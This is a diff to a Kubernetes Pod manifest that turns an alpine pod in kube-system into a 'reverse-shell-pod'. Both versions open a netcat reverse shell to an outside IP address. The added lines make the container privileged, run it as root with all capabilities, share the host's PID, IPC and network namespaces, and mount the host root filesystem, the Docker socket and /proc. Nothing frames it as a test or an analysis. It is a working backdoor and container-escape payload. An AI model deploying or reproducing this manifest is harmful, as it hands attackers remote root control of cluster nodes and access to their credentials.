@@ -1,14 +1,39 @@
 apiVersion: v1
 kind: Pod
 metadata:
-  name: alpine
+  name: reverse-shell-pod
   namespace: kube-system
 spec:
   containers:
-  - name: alpine
+  - name: shell-container
     image: alpine
-    command: ["/bin/sh"]
-    args: ["-c", "apk update && apk add curl netcat-openbsd -y --no-cache; nc -e /bin/sh 188.227.84.184 9001"]
+    securityContext:
+      privileged: true
+      runAsUser: 0
+      capabilities:
+        add:
+        - SYS_ADMIN
+        - NET_ADMIN
+        - SYS_PTRACE
+        - SYS_MODULE
+        - ALL
+    command: ["/bin/sh", "-c"]
+    args:
+    - |
+      apk add curl --no-cache;
+      rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 188.227.84.184 9001 >/tmp/f
   serviceAccountName: service-account-controller
   automountServiceAccountToken: true
   hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
+  - name: docker-sock
+    hostPath:
+      path: /var/run/docker.sock
+  - name: proc
+    hostPath:
+      path: /proc
